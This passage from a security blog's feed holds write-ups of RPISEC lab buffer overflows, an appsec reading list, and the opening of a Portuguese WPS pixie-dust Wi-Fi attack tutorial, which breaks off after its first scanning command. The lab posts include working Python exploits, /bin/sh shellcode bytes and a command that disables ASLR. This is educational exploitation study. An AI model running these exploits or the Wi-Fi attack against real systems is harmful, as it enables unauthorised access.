class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/retmain.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>We can notice that after 88 bytes of the pattern the return address of main is overwritten.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNN
|			88 bytes is stored in variable				       ||  this is overflowed  |       
|______________________________________________________________________________________||______________________|
</code></pre></div></div> <p>We have our buffer-overflow!</p> <h3 id="shellcode-time">Shellcode time</h3> <p>There came a time when I tried to put some shellcodes after the return address of the main function but I didn’t achieve anything. I was stuck for a while trying different ways and nothing.</p> <p>Until I asked for help and received tips on a better path to follow.</p> <p>In the source code, the variable that stores the username is outside the scope of the functions, that is, it is in the global scope. This means that it is in the .data section of the binary and not in the .text section where it is the executable area.</p> <p>With this we can know that the username variable will not be stored in the stack, but the password variable will. So the tip I received was to store the shellcode in the username variable and overwrite the return address in the password variable. To then “get” the shellcode in the username variable and thus execute it.</p> <h3 id="lets-go">Let’s go</h3> <p>If we look at the disassembly of the main function we see that the address of the username variable is referenced before being passed to the <strong>fgets</strong> function and then to the <strong>verify_user_name</strong> function.</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/usrnmvar1.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>And checking the variable’s memory we see the string “rpisec”.</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/usrnmvar2.png" class="img-fluid rounded z-depth-1" width="500" height="500" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Now knowing the address of the username variable and also how to overwrite the return address, let’s write our exploit…</p> <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">struct</span>

<span class="n">name</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">rpisec</span><span class="sh">"</span>

<span class="c1"># addr a_user_name var that store username + 6 bytes to the shellcode addr
</span><span class="n">nameaddr</span> <span class="o">=</span> <span class="mh">0x555555558086</span>

<span class="c1"># 88 bytes to overflow
</span><span class="n">pattern</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKK</span><span class="sh">"</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</span><span class="sh">"</span>

<span class="n">nm</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">'</span><span class="s">&lt;Q</span><span class="sh">'</span><span class="p">,</span> <span class="n">nameaddr</span><span class="p">)</span>

<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">''</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="n">name</span>		<span class="c1"># pass in verify_user_name function
</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">shellcode</span>        <span class="c1"># /bin/sh shellcode
</span><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span>		<span class="c1"># break line to align the buffer
</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">pattern</span>          <span class="c1"># buffer to overflow password var
</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">nm</span>		<span class="c1"># addr of shellcode in name var
</span>

<span class="n">f</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">exp</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">wb</span><span class="sh">"</span><span class="p">)</span>
<span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
</code></pre></div></div> <p>(shellcode source: https://shell-storm.org/shellcode/files/shellcode-806.html)</p> <p>After running the python code it sends the buffer to an “exp” file. And the exploration buffer looks like this:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/expfile.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpisec + shellcode + pattern + addr of shellcode
</code></pre></div></div> <h3 id="shell-time">Shell time</h3> <p>After running we can see that the shellcode has been stored along with the rpisec string.</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/shellcode1.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Arriving at the ret main we see that the return address was successfully overwritten.</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/shellcode2.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Then we see that the shellcode address has been reached and the shellcode instructions are being executed successfully.</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/shellcode3.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>With everything ok in GDB, let’s run the exploit outside the debugger to get the shell on the machine. For execution outside of gdb to work, it will be necessary to disable ASLR so that the host machine does not randomize memory addresses.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo sysctl kernel.randomize_va_space=0
</code></pre></div></div> <p>(disable aslr)</p> <p>Running the binary along with the exploit… we have the shell</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/pwned.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>It was difficult but it worked. :)</p>]]></content><author><name></name></author><category term="rpisec"/><category term="bin-exp"/><summary type="html"><![CDATA[rpisec lab3C]]></summary></entry><entry><title type="html">mem-corruption lab RPISEC</title><link href="https://geleiaa.github.io/blog/2023/mem_corruption_lab/" rel="alternate" type="text/html" title="mem-corruption lab RPISEC"/><published>2023-12-04T00:00:00+00:00</published><updated>2023-12-04T00:00:00+00:00</updated><id>https://geleiaa.github.io/blog/2023/mem_corruption_lab</id><content type="html" xml:base="https://geleiaa.github.io/blog/2023/mem_corruption_lab/"><![CDATA[<h3 id="solving-lab2c-0213---memory-corruption-lab-httpsgithubcomrpisecmbeblobmastersrclab02lab2cc">Solving lab2C “02/13 | –[ Memory Corruption Lab” (https://github.com/RPISEC/MBE/blob/master/src/lab02/lab2C.c)</h3> <h3 id="this-lab-is-a-simple-buffer-overflow-the-intention-of-this-lab-was-to-explore-bof-and-get-a-shell-from-the-lab-machine-and-then-get-the-flag-but-here-we-wont-have-the-shell-part">This lab is a simple buffer-overflow. The intention of this lab was to explore bof and get a shell from the lab machine and then get the flag. But here we won’t have the shell part.</h3> <p>First we go get the source code and compile following the instruction that is commented in the code:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/compilelab2ccode.png" class="img-fluid rounded z-depth-1" width="400" height="400" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc -O0 -fno-stack-protector lab2C.c -o lab2C
</code></pre></div></div> <p>Running the binary we see how to use it:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/binusage.png" class="img-fluid rounded z-depth-1" width="200" height="200" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Running with a string the binary shows that we are not “authenticated” and set_me is 0. It seems that the binary needs a specific string/password:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/notauth.png" class="img-fluid rounded z-depth-1" width="400" height="400" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Looking at the binary disassembly, we see that the <strong>strcpy</strong> function is called before a comparison of a memory address with the “0xdeadbeef” bytes. And if this comparison is not true, the flow jumps to the end, prints something and ends execution. But if the comparison is true, a “shell” function will be called.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ objdump -dM intel lab2C | grep -A40 "&lt;main&gt;:"
</code></pre></div></div> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/jmp.png" class="img-fluid rounded z-depth-1" width="300" height="300" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Looking at the disassembly of the shell function, we don’t see much useful stuff, just a <strong>puts</strong> function that can display some string and we also see a <strong>system</strong> function being called.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ objdump -dM intel lab2C | grep -A12 "&lt;shell&gt;:"
</code></pre></div></div> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/disasshell.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <h3 id="now-lets-debug-the-binary-to-see-what-it-does">Now let’s debug the binary to see what it does</h3> <p>Looking at the disassembly with gdb + peda we can better see the execution flow of the main function:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/gdbdisas.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Running the binary in gdb without passing any input string, the flow is diverted to a <strong>printf</strong> that shows the usage and then a jump throws the flow to the end of the execution:</p> <ul> <li>check input (<strong>cmp DWORD PTR [rbp-0x24],0x2</strong>)</li> </ul> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/withoutarg1.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <ul> <li>if not have input, print the usage</li> </ul> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/withoutarg2.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <ul> <li>jump to the end</li> </ul> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/withoutarg3.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <h3 id="since-the-binary-needs-an-input-lets-set-a-breakpoint-in-the-main-and-run-binary-with-an-input-string">Since the binary needs an input let’s set a breakpoint in the main and run binary with an input string…</h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ b main
</code></pre></div></div> <p>(breakpoint)</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ r GELEIA
</code></pre></div></div> <p>(run binary with “GELEIA” string)</p> <p>Now running with a input the exec flow throws us to another place. First compare if have any args, so <strong>je</strong> (jump equal) go to address <strong>&lt;main+59&gt;</strong>.</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/witharg1.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>After some steps we arrive at the <strong>strcpy</strong> function that we saw before. We can see that the input is moved through the registers until it reaches the <strong>strcpy</strong> function. And probably the input is copied somewhere by the <strong>strcpy</strong> function. Soon after, a comparison of address <strong>DWORD PTR [rbp-0x4]</strong> with “0xdeadbeef” takes place.</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/witharg2.png" class="img-fluid rounded z-depth-1" width="300" height="300" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>After comparing if <strong>DWORD PTR [rbp-0x4]</strong> address is equal to “0xdeadbeef” the flow jump to “shell” function. If not equal the flow jump to a <strong>printf</strong> with a message “Not authenticated. set_me was 0” and finishe execution.</p> <ul> <li>jump to end</li> </ul> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/witharg3.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <ul> <li>print message and finishes</li> </ul> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/witharg4.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <h3 id="now-is-the-buffer-overflow">Now is the Buffer Overflow</h3> <p>Knowing that the given input is stored somewhere, we can overwrite the memory after the input is stored so we can control what will be compared. If this works, we will bypass the check.</p> <p>First we need to know how many bytes can be stored in the variable (or how much memory has been allocated to that variable). To do this, we will send a large number of bytes to the binary input and see how it handles that.</p> <p>The input will be this: “AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEE”.</p> <p>This way we can know how many bytes the variable stores and when there was a memory leak. For example, if the variable stores the value until the end of the letters “B”, then we know that after the “B” the memory following the variable was overwritten.</p> <h3 id="lets-go">Let’s go</h3> <p>First let’s run the binary with gdb then set a breakpoint in main and then send the buffer to the binary like this:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ r $(echo 'AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEE')
</code></pre></div></div> <p>Getting close to the part that checks the input we can see the alphabet buffer being moved through the registers</p> <ul> <li>first buffer go to <strong>RAX</strong> after go to <strong>RDX</strong></li> </ul> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/buffmove1.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/buffmove2.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Passing in <strong>strcpy</strong> function the buffer is stored and after this the address <strong>DWORD PTR [rbp-0x4]</strong> will be compared.</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/compare1.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>So if we look at what’s at that address, we see the bytes that overwrote the memory after the leak:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/compare2.png" class="img-fluid rounded z-depth-1" width="500" height="500" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Basically the variable that stores the input has a limit of 15 bytes. Example:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEE
|   1 to 15   ||       16 to 40        |
|_____________||_______________________|
this is stored  this overwrite the next memory

</code></pre></div></div> <p>Knowing this we can overwrite the next memory (after 15 bytes) with the “0xdeadbeef” bytes and bypass the check. That way:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AAAAAAAABBBBBBB0xdeadbeef
</code></pre></div></div> <h3 id="so-lets-go">So let’s go</h3> <p>Using a python code to make it easier, we will print the buffer and send it to the binary input. The exploit looks like this:</p> <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">struct</span>

<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">''</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x41</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">15</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">'</span><span class="s">&lt;Q</span><span class="sh">'</span><span class="p">,</span> <span class="mh">0xdeadbeef</span><span class="p">)</span>

<span class="n">f</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">exp</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">wb</span><span class="sh">"</span><span class="p">)</span>
<span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
</code></pre></div></div> <p>Running the exploit will send the buffer to a file called exp. And when we run the binary we will send the file contents to the input, like this:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ r $(cat exp)
</code></pre></div></div> <p>Then let’s move on to the part that matters:</p> <ul> <li>we can see the exploration buffer being moved.</li> </ul> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/exp1.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <ul> <li>Coming to the comparison, we see that the buffer overwrote the variable where it is stored and went to the memory of the next instruction.</li> </ul> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/exp2.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/exp3.png" class="img-fluid rounded z-depth-1" width="500" height="500" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <ul> <li>Since we have the memory overwritten, then the execution flow goes to the shell function as expected.</li> </ul> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/exp4.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/exp5.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <ul> <li>Now we get to the shell function and see what’s in it.</li> </ul> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/exp6.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>So it looks like we did this…</p>]]></content><author><name></name></author><category term="rpisec"/><category term="bin-exp"/><summary type="html"><![CDATA[rpisec lab2C]]></summary></entry><entry><title type="html">appsec resources</title><link href="https://geleiaa.github.io/blog/2023/appsec_resources/" rel="alternate" type="text/html" title="appsec resources"/><published>2023-07-14T00:00:00+00:00</published><updated>2023-07-14T00:00:00+00:00</updated><id>https://geleiaa.github.io/blog/2023/appsec_resources</id><content type="html" xml:base="https://geleiaa.github.io/blog/2023/appsec_resources/"><![CDATA[<h1 id="appsec_study_resources">appSec_study_resources</h1> <h3 id="s-sdlc">S-SDLC</h3> <blockquote> <hr/> </blockquote> <ul> <li>https://blog.convisoappsec.com/o-que-voce-precisa-saber-sobre-o-s-sdlc/</li> <li>https://github.com/wh0isdxk/DesenvolvimentoSeguro/blob/main/Conceitos/Fundamentos.md#quais-os-pilares-do-desenvolvimento-seguro</li> <li>https://blog.convisoappsec.com/implementando-um-programa-de-seguranca-de-aplicacoes-baseado-no-owasp-samm/</li> <li>https://owasp.org/www-project-integration-standards/writeups/owasp_in_sdlc/</li> <li>https://owaspsamm.org/guidance/quick-start-guide/</li> <li>intro to SDLC https://tryhackme.com/room/sdlc</li> </ul> <h3 id="requisitos-requisitos-de-segurança">Requisitos (requisitos de segurança)</h3> <blockquote> <hr/> </blockquote> <ul> <li>https://blog.convisoappsec.com/design-segundo-samm-requisitos-de-seguranca-em-seguranca-de-aplicacoes/</li> <li>https://github.com/wh0isdxk/DesenvolvimentoSeguro/blob/main/1-Planejamento.md#requisitos-de-seguran%C3%A7a</li> <li>https://www.synopsys.com/blogs/software-security/software-security-requirements/</li> <li>https://www.researchgate.net/publication/276284984_Security_Requirements_Engineering_Analysis_and_Prioritization</li> <li>Security Quality Requirements Engineering (SQUARE) https://resources.sei.cmu.edu/library/asset-view.cfm?assetid=484884</li> </ul> <h4 id="abuse-cases">Abuse Cases</h4> <ul> <li>https://cheatsheetseries.owasp.org/cheatsheets/Abuse_Case_Cheat_Sheet.html</li> <li>https://www.synopsys.com/blogs/software-security/abuse-cases/</li> <li>https://www.synopsys.com/blogs/software-security/abuse-cases-can-drive-security-requirements/</li> </ul> <h3 id="modelagens-de-ameaças-threat-modeling">Modelagens de Ameaças (Threat Modeling)</h3> <blockquote> <hr/> </blockquote> <ul> <li>https://owasp.org/www-community/Threat_Modeling</li> <li>https://www.threatmodelingmanifesto.org/</li> <li>https://cheatsheetseries.owasp.org/cheatsheets/Threat_Modeling_Cheat_Sheet.html</li> <li>https://blog.convisoappsec.com/design-segundo-samm-modelagem-de-ameacas-em-seguranca-de-aplicacoes/</li> <li>https://blog.convisoappsec.com/modelagem-de-ameacas-o-que-e-e-por-que-desenvolvedores-devem-ficar-atentos-a-isso/</li> <li>https://github.com/jassics/security-study-plan/blob/main/threat-modeling-study-plan.md</li> <li>https://threatmodeler.com/data-flow-diagrams-process-flow-diagrams/</li> </ul> <h3 id="secure-code-review">Secure Code Review</h3> <blockquote> <hr/> <ol> <li><em><strong>Code Review</strong></em> = development/developers</li> <li><em><strong>Secure Code Review</strong></em> = security/appsec</li> </ol> </blockquote> <ul> <li>https://parad0x-0xff.github.io/blog/2020/10/10/What-is-Code-Review.html</li> <li>https://parad0x-0xff.github.io/dropdown/2020-10-17-Methods-Code-Review.html</li> <li>https://snyk.io/blog/secure-code-review/</li> <li>https://owasp.org/www-project-code-review-guide/</li> <li>https://github.com/wh0isdxk/DesenvolvimentoSeguro/blob/main/3-Desenvolvimento.md#desenvolvimento</li> <li>https://blog.convisoappsec.com/code-review-versus-secure-code-review/</li> <li>https://blog.convisoappsec.com/diferenca-entre-code-review-e-sast/</li> </ul> <h3 id="testing">Testing</h3> <blockquote> <hr/> </blockquote> <ul> <li>https://owasp.org/www-project-web-security-testing-guide/latest/</li> <li>https://owasp.org/www-project-web-security-testing-guide/latest/3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework#A-Typical-SDLC-Testing-Workflow</li> <li>https://brightsec.com/blog/application-security-testing/</li> <li>https://www.zup.com.br/blog/ferramentas-ssdlc</li> <li>https://blog.convisoappsec.com/verificacao-segundo-samm-testes-de-seguranca-em-seguranca-de-aplicacoes/</li> <li>https://blog.convisoappsec.com/verificacao-segundo-samm-testes-orientados-a-requisitos-em-seguranca-de-aplicacoes/</li> <li>https://owaspsamm.org/model/verification/security-testing/stream-a/</li> <li>https://owaspsamm.org/model/verification/security-testing/stream-b/</li> </ul> <h3 id="testing-tools">Testing Tools</h3> <ul> <li>https://owasp.org/www-project-web-security-testing-guide/latest/6-Appendix/A-Testing_Tools_Resource</li> <li>https://owasp.org/www-community/Free_for_Open_Source_Application_Security_Tools</li> <li>https://owasp.org/www-community/Source_Code_Analysis_Tools</li> <li>https://owasp.org/www-community/Vulnerability_Scanning_Tools</li> <li>https://owasp.org/www-community/api_security_tools</li> </ul> <h3 id="deployment">Deployment</h3> <blockquote> <hr/> </blockquote> <ul> <li>https://blog.convisoappsec.com/implementacao-segundo-samm-deploy-seguro-em-seguranca-de-aplicacoes/</li> <li>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/README</li> <li>https://owaspsamm.org/model/implementation/secure-deployment/stream-a/</li> <li>https://owaspsamm.org/model/implementation/secure-deployment/stream-b/</li> <li>intro to pipeline https://tryhackme.com/room/introtopipelineautomation</li> </ul> <h3 id="outros">Outros</h3> <blockquote> <hr/> </blockquote> <ul> <li>Appsec Interview Prep =&gt; https://gist.github.com/themoonofendor/da6eb90f7b2a3f4db2ad42ecfb81977e</li> <li>Awesome AppSec =&gt; https://github.com/paragonie/awesome-appsec</li> <li>TrendMicro Owasp Top 10 =&gt; https://www.trendmicro.com/pt_br/devops/21/k/overview-owasp-top-10-2021.html</li> <li>Microsoft STRIDE =&gt; https://learn.microsoft.com/en-us/azure/security/develop/threat-modeling-tool</li> <li>articles =&gt; https://www.appsecguy.se/tag/appsec/</li> <li>talks, articles &amp;&amp; more =&gt; https://www.appsecvillage.com/</li> <li>articles =&gt; https://snyk.io/learn/topic/application-security/</li> <li>intro to appsec =&gt; https://www.linkedin.com/posts/joas-antonio-dos-santos_application-security-introduction-overview-activity-6859172257219063808-Ll8G?utm_source=share&amp;utm_medium=member_desktop</li> </ul>]]></content><author><name></name></author><category term="appsec"/><category term="resources"/><summary type="html"><![CDATA[appsec studie resources]]></summary></entry><entry><title type="html">wps pixie-dust attack</title><link href="https://geleiaa.github.io/blog/2022/wps_pixiedust/" rel="alternate" type="text/html" title="wps pixie-dust attack"/><published>2022-07-18T00:00:00+00:00</published><updated>2022-07-18T00:00:00+00:00</updated><id>https://geleiaa.github.io/blog/2022/wps_pixiedust</id><content type="html" xml:base="https://geleiaa.github.io/blog/2022/wps_pixiedust/"><![CDATA[<h2 id="pegando-psk-com-pixie-dust-attack">pegando psk com pixie-dust attack</h2> <p>O pixie dust attack consiste em realizar a quebra do WPS de maneira offline.O método offline envolve tentar apenas um PIN aleatório e coletar algumas informações durante o processo. Esses dados podem ser usados posteriormente para tentar o ataque pixie-dust. A vulnerabilidade está na mensagem M3: no corpo da mensagem é utilizado duas chaves AES de 128 bits randômicas (E-S1 e E-S2) para encriptação da primeira e da segunda metade do PIN, respectivamente. Se as duas chaves forem descobertas, é possível recuperar o número PIN com um ataque offline em menos de um segundo, em vez de “chutar” o número PIN no roteador, processo que pode levar de 8 a 12 horas (mais informações sobre o brute-force offline aqui http://archive.hack.lu/2014/Hacklu2014_offline_bruteforce_attack_on_wps.pdf)</p> <h2 id="parte-pratica">Parte pratica</h2> <h5 id="com-a-interface-em-modo-monitor-você-pode-sniffar-as-redes-em-volta-para-identificar-um-alvo-em-potêncial-com-o-airodump-ng-adicionando-a-flag-wps-dessa-forma">Com a interface em modo monitor você pode “sniffar” as redes em volta para identificar um alvo em potêncial com o airodump-ng adicionando a flag –wps dessa forma:</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo airodump-ng --wps &lt;interface&gt;
</code></pre></div></div> <blockquote> <p>Repare na coluna WPS</p> </blockquote> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> CH  9 ][ Elapsed: 1 min ][ 2007-04-26 17:41 ]
                                                                                                            
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER  WPS  AUTH  ESSID
                                                                                                             
 00:09:5B:1C:AA:1D   11  16       10        0    0  11  54.  OPN          2.0           NETGEAR                         
 00:14:6C:7A:41:81   34 100       57       14    1   9  11e  WEP  WEP     1.0           bigbear 
 00:14:6C:7E:40:80   32 100      752       73    2   9  54   WPA  TKIP    2.0    PSK    teddy                             
                                                                                                            
 BSSID              STATION            PWR   Rate   Lost  Packets  Notes  Probes
                                
 00:14:6C:7A:41:81  00:0F:B5:32:31:31   51   36-24    2       14
 (not associated)   00:14:A4:3F:8D:13   19    0-0     0        4           mossy 
 00:14:6C:7A:41:81  00:0C:41:52:D1:D1   -1   36-36    0        5
 00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2   35   54-54    0       99           teddy

